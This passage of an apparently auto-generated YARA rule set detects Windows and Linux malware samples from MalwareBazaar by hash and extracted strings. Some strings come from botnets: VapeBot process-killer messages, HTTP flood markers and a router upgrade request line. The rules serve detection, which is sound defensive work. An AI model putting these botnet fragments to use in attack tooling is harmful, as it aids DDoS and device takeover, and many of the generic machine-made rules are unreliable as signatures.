        description = "Auto ML: 52ecf2eaeed9b8deafb3a699cb573d5f1c90872290c3cfdd0355ca241b9f6f5b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GetInt32"
        $s5 = "WindowsFormsApplication6"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "System.Data"
        $s9 = "getData"
        $s10 = "loaddata"
        $s11 = "Read"
        $s12 = "Form1_Load"
        $s13 = "layMNV_Load"
        $s14 = "HosoNV_Load"
        $s15 = "add_Load"
        $s16 = "ChiTietChamCong_Load"
        $s17 = "Luong_Load"
        $s18 = "DangKi_Load"
        $s19 = "PhuCap_Load"
        $s20 = "DangNhap_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 697KB and
        all of them
}

rule Windows_5327308fee51fc6bb95996c4185c4cfcbac580b747d79363c7cf66505f3ff6db
{
    meta:
        description = "Auto ML: 5327308fee51fc6bb95996c4185c4cfcbac580b747d79363c7cf66505f3ff6db"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "setybdetH1"
        $s7 = "setybdetL1"
        $s8 = "uespemosarenegylmodnarodsetybdet"
        $s9 = "alserueullC:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\serde_json-1.0.82\\src\\de.rs"
        $s10 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\serde_json-1.0.82\\src\\ser.rs"
        $s11 = "attempt to calculate the remainder with a divisor of zeroC:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\block-buffer-0.10.2\\src\\lib.rs"
        $s12 = "/rustc/e092d0b6b43f2de967af0887873151bb1c0b18d3\\library\\std\\src\\io\\readbuf.rs"
        $s13 = "attempt to join into collection with len > usize::MAX/rustc/e092d0b6b43f2de967af0887873151bb1c0b18d3\\library\\alloc\\src\\str.rs"
        $s14 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\hyper-0.14.20\\src\\body\\to_bytes.rs"
        $s15 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\tokio-1.20.1\\src\\runtime\\thread_pool\\mod.rs"
        $s16 = "failed to park thread"
        $s17 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\tokio-1.20.1\\src\\runtime\\mod.rs"
        $s18 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\rand_core-0.6.3\\src\\block.rs"
        $s19 = "C:\\Users\\Administrator\\.cargo\\registry\\src\\github.com-1ecc6299db9ec823\\reqwest-0.11.11\\src\\async_impl\\response.rs"
        $s20 = "src\\.\\tcp_conn\\windows.rs"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1552KB and
        all of them
}

rule Linux_533775b86d8c4674b995ee08ad1394702e2cda7d5aa5ce98dac14dbd25d85f7b
{
    meta:
        description = "Auto ML: 533775b86d8c4674b995ee08ad1394702e2cda7d5aa5ce98dac14dbd25d85f7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "cmdline"
        $s4 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s5 = "/proc/%s/cmdline"
        $s6 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s7 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s9 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s10 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s11 = "systemd"
        $s12 = "http"
        $s13 = "(deleted)"
        $s14 = "/proc/self/cmdline"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 165KB and
        all of them
}

rule Windows_5337ee7f8aa1a26585d70bc5b2e2aacd0f3346eb638e8b80fabf6ca36df4963e
{
    meta:
        description = "Auto ML: 5337ee7f8aa1a26585d70bc5b2e2aacd0f3346eb638e8b80fabf6ca36df4963e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "`local static thread guard'"
        $s18 = "`placement delete[] closure'"
        $s19 = "`placement delete closure'"
        $s20 = "delete[]"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 308KB and
        all of them
}

rule Windows_06964dd3189bad530f3e1f1b866ccd300672eac8d3889ff327724927770b0389
{
    meta:
        description = "Auto ML: 06964dd3189bad530f3e1f1b866ccd300672eac8d3889ff327724927770b0389"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Microsoft.Win32"
        $s5 = "<Module>"
        $s6 = "get_FormatID"
        $s7 = "get_ASCII"
        $s8 = "System.IO"
        $s9 = "System.Collections.Generic"
        $s10 = "get_SendSync"
        $s11 = "EndRead"
        $s12 = "BeginRead"
        $s13 = "Thread"
        $s14 = "Load"
        $s15 = "get_Connected"
        $s16 = "get_IsConnected"
        $s17 = "set_IsConnected"
        $s18 = "get_Guid"
        $s19 = "<IsConnected>k__BackingField"
        $s20 = "<Offset>k__BackingField"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 48KB and
        all of them
}

rule Windows_539471f0ad07c5b7ad10b55ed4f9ded8f481384f3fdb1a7395e657010e00986a
{
    meta:
        description = "Auto ML: 539471f0ad07c5b7ad10b55ed4f9ded8f481384f3fdb1a7395e657010e00986a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "AreFileApisANSI"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = ".text$mn"
        $s16 = ".text$x"
        $s17 = ".rdata"
        $s18 = ".rdata$r"
        $s19 = ".rdata$sxdata"
        $s20 = ".rdata$voltmd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 689KB and
        all of them
}

rule Linux_53b9f7cc74705d5e8c330b5054e55e04b3dc9a3bf83fb9a07f8dcb4dd7a84963
{
    meta:
        description = "Auto ML: 53b9f7cc74705d5e8c330b5054e55e04b3dc9a3bf83fb9a07f8dcb4dd7a84963"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "time.DatH"
        $s2 = ";fileu"
        $s3 = ":windu"
        $s4 = "8windu"
        $s5 = "8open"
        $s6 = "9fileu"
        $s7 = ">fileuG"
        $s8 = ":fileu"
        $s9 = "<$fileu"
        $s10 = "Read"
        $s11 = "File"
        $s12 = "Open"
        $s13 = "file"
        $s14 = "Load"
        $s15 = "read"
        $s16 = "load"
        $s17 = "user"
        $s18 = "Write"
        $s19 = "close"
        $s20 = "Close"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 3060KB and
        all of them
}

rule Linux_5437dda04c8ce748054771bd8bd95c224a09997e319d35ade5e5d004fa247194
{
    meta:
        description = "Auto ML: 5437dda04c8ce748054771bd8bd95c224a09997e319d35ade5e5d004fa247194"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
        $s5 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Linux_548da0db38e363a75d4d386da3f2bcde5b2c2e1d88168f4e77275db55924c1c6
{
    meta:
        description = "Auto ML: 548da0db38e363a75d4d386da3f2bcde5b2c2e1d88168f4e77275db55924c1c6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB and
        all of them
}

rule Windows_5492748ca440d8925ca1c6520e50400757ab1631e51f5936a008cffcb8ddfec9
{
    meta:
        description = "Auto ML: 5492748ca440d8925ca1c6520e50400757ab1631e51f5936a008cffcb8ddfec9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "KERNEL32.DLL"
        $s3 = "COMCTL32.dll"
        $s4 = "MSIMG32.dll"
        $s5 = "MSVCRT.dll"
        $s6 = "MSVFW32.dll"
        $s7 = "USER32.dll"
        $s8 = "LoadLibraryA"
        $s9 = "GetProcAddress"
        $s10 = "DrawDibOpen"
        $s11 = "GetDC"
        $s12 = "SkinH_EL.dll"
        $s13 = "SkinH_GetColor"
        $s14 = "SkinH_SetAero"
        $s15 = "SkinH_SetBackColor"
        $s16 = "SkinH_SetFont"
        $s17 = "SkinH_SetFontEx"
        $s18 = "SkinH_SetForeColor"
        $s19 = "SkinH_SetMenuAlpha"
        $s20 = "SkinH_SetTitleMenuBar"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1022KB and
        all of them
}

rule Linux_54b47777007f18aa301f9ad1b8bc8abcd128b889e373d7e8f56a7bb3b117a116
{
    meta:
        description = "Auto ML: 54b47777007f18aa301f9ad1b8bc8abcd128b889e373d7e8f56a7bb3b117a116"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 88KB and
        all of them
}

rule Windows_54bbe2729a4337e528aa30d723c0b7e6054cb611fbacd910b770010d3b0545ec
{
    meta:
        description = "Auto ML: 54bbe2729a4337e528aa30d723c0b7e6054cb611fbacd910b770010d3b0545ec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "USERENV"
        $s6 = "SETUPAPI"
        $s7 = "DeleteFileW"
        $s8 = "FindFirstFileW"
        $s9 = "FindNextFileW"
        $s10 = "FindClose"
        $s11 = "SetFilePointer"
        $s12 = "ReadFile"
        $s13 = "GetPrivateProfileStringW"
        $s14 = "WritePrivateProfileStringW"
        $s15 = "LoadLibraryExW"
        $s16 = "GetModuleHandleW"
        $s17 = "CloseHandle"
        $s18 = "SetFileTime"
        $s19 = "CompareFileTime"
        $s20 = "GetShortPathNameW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 866KB and
        all of them
}

rule Windows_5504d377694e9bcfed6be2f122affa42fa9c0847c8d23561b52ded5bbd12dfff
{
    meta:
        description = "Auto ML: 5504d377694e9bcfed6be2f122affa42fa9c0847c8d23561b52ded5bbd12dfff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6621KB and
        all of them
}

rule Windows_557c5b6678b5b3badb6a7703e4491a9b354a353cdef83c4f6415b422cd17a999
{
    meta:
        description = "Auto ML: 557c5b6678b5b3badb6a7703e4491a9b354a353cdef83c4f6415b422cd17a999"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Security"
        $s13 = "SecurityRuleSet"
        $s14 = "map_markings_with_refuelling_locations.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7188KB and
        all of them
}

rule Linux_561a61b05c518ff7a2fb8fbb127aabe5b51fc736e1e7285aff3083b494a16004
{
    meta:
        description = "Auto ML: 561a61b05c518ff7a2fb8fbb127aabe5b51fc736e1e7285aff3083b494a16004"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuGET"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "[http flood] headers: \"%s\""
        $s5 = "http"
        $s6 = "socket:"
        $s7 = "No such file or directory"
        $s8 = "No such process"
        $s9 = "Interrupted system call"
        $s10 = "Bad file descriptor"
        $s11 = "No child processes"
        $s12 = "Resource temporarily unavailable"
        $s13 = "File exists"
        $s14 = "Too many open files in system"
        $s15 = "Too many open files"
        $s16 = "Text file busy"
        $s17 = "File too large"
        $s18 = "Read-only file system"
        $s19 = "File name too long"
        $s20 = "Level 3 reset"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Linux_06e1e5c18b69560b06263e86b7f620bdca8d640c53f163b0a653b86e07713306
{
    meta:
        description = "Auto ML: 06e1e5c18b69560b06263e86b7f620bdca8d640c53f163b0a653b86e07713306"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)"
        $s2 = "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)"
        $s3 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00"
        $s4 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00"
        $s6 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01"
        $s7 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00"
        $s8 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36"
        $s10 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0"
        $s11 = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
        $s12 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36"
        $s13 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36"
        $s14 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        $s15 = "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)"
        $s16 = "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
        $s17 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
        $s18 = "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
        $s19 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)"
        $s20 = "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 123KB and
        all of them
}

rule Windows_56b4f307126f78e16ac2ad2e4044de61cb207864bf194ba6702108cb65475369
{
    meta:
        description = "Auto ML: 56b4f307126f78e16ac2ad2e4044de61cb207864bf194ba6702108cb65475369"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "CorExitProcess"
        $s5 = "FlsGetValue"
        $s6 = "FlsSetValue"
        $s7 = "CreateEventExW"
        $s8 = "CreateSemaphoreExW"
        $s9 = "SetThreadStackGuarantee"
        $s10 = "CreateThreadpoolTimer"
        $s11 = "SetThreadpoolTimer"
        $s12 = "WaitForThreadpoolTimerCallbacks"
        $s13 = "CloseThreadpoolTimer"
        $s14 = "CreateThreadpoolWait"
        $s15 = "SetThreadpoolWait"
        $s16 = "CloseThreadpoolWait"
        $s17 = "FlushProcessWriteBuffers"
        $s18 = "GetCurrentProcessorNumber"
        $s19 = "GetLogicalProcessorInformation"
        $s20 = "CreateSymbolicLinkW"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 503KB and
        all of them
}

rule Windows_56be2a8ce03a8cd28e291f51297f68cde648cd0e7245bb2686706481a52df619
{
    meta:
        description = "Auto ML: 56be2a8ce03a8cd28e291f51297f68cde648cd0e7245bb2686706481a52df619"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Linux_56d3c57a6ac82fe6f8175cc31d6d70bbe874cd48e760d642359106f15913cfe1
{
    meta:
        description = "Auto ML: 56d3c57a6ac82fe6f8175cc31d6d70bbe874cd48e760d642359106f15913cfe1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/%s/cmdline"
        $s4 = "systemd"
        $s5 = "http"
        $s6 = "(deleted)"
        $s7 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s9 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s10 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s11 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s12 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s13 = "/proc/self/cmdline"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 67KB and
        all of them
}

rule Windows_56f2e82c10506d2ad399bbcd547fb4869909d7c9a64a3add918bf7534640d323
{
    meta:
        description = "Auto ML: 56f2e82c10506d2ad399bbcd547fb4869909d7c9a64a3add918bf7534640d323"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4004KB and
        all of them
}

rule Windows_5712d6afcbf5c83892bf3f622e946b7461ad04f3663ef44a29fab1ab3ce67730
{
    meta:
        description = "Auto ML: 5712d6afcbf5c83892bf3f622e946b7461ad04f3663ef44a29fab1ab3ce67730"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "][]]980e439165c5a77b=nekoTyeKcilbuP ,lartuen=erutluC ,0.0.0.4=noisreV ,bilrocsm ,tcejbO.metsyS[[1`tseTciD+tseTretteG+noitcelloCegdirBytreporP.snoitcelloC.iwnydgbtsO"
        $s6 = "ygetartS.noitacificepS"
        $s7 = "rotpircseD.stseT"
        $s8 = "rehctaWtseT"
        $s9 = "ygetartStreveR"
        $s10 = "ygetartSetupmoC"
        $s11 = "ygetartStnirP"
        $s12 = "ygetartShcraeS"
        $s13 = "ygetartSddA"
        $s14 = "ygetartSetaitnatsnI"
        $s15 = "ygetartSeganaM"
        $s16 = "ygetartShsuP"
        $s17 = "ygetartSyfireV"
        $s18 = "ygetartSdniF"
        $s19 = "ygetartStessA"
        $s20 = "ygetartSpoP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 820KB and
        all of them
}

rule Windows_5719504e2f4e976c8ce6fbfda399b80273e783ff05f61dfd1f1bd4737f0bde8a
{
    meta:
        description = "Auto ML: 5719504e2f4e976c8ce6fbfda399b80273e783ff05f61dfd1f1bd4737f0bde8a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GetProcessWindowStation"
        $s16 = "GetUserObjectInformationA"
        $s17 = "GetLastActivePopup"
        $s18 = "GetActiveWindow"
        $s19 = "USER32.DLL"
        $s20 = "msimg32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 247KB and
        all of them
}

rule Linux_572265e043fcd3068bb32bbc7f495071875cc958f5066a80b47976579fcacb5d
{
    meta:
        description = "Auto ML: 572265e043fcd3068bb32bbc7f495071875cc958f5066a80b47976579fcacb5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "[http flood] headers: \"%s\""
        $s4 = "http"
        $s5 = "socket:"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 70KB and
        all of them
}

rule Windows_5769990f534b9e77b10af7b86276d41673e4e5e81ee2be5768f838e838299cff
{
    meta:
        description = "Auto ML: 5769990f534b9e77b10af7b86276d41673e4e5e81ee2be5768f838e838299cff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1275KB and
        all of them
}

rule Windows_57718e813be532410d6612dbd6fbd43ff94d900aee8b6defa03f27039805506f
{
    meta:
        description = "Auto ML: 57718e813be532410d6612dbd6fbd43ff94d900aee8b6defa03f27039805506f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "user32.dll"
        $s8 = "kernel32.dll"
        $s9 = "user32"
        $s10 = "kernel32"
        $s11 = "shell32.dll"
        $s12 = "EnumWindows"
        $s13 = "GetWindowThreadProcessId"
        $s14 = "CreateToolhelp32Snapshot"
        $s15 = "Process32First"
        $s16 = "Process32Next"
        $s17 = "CloseHandle"
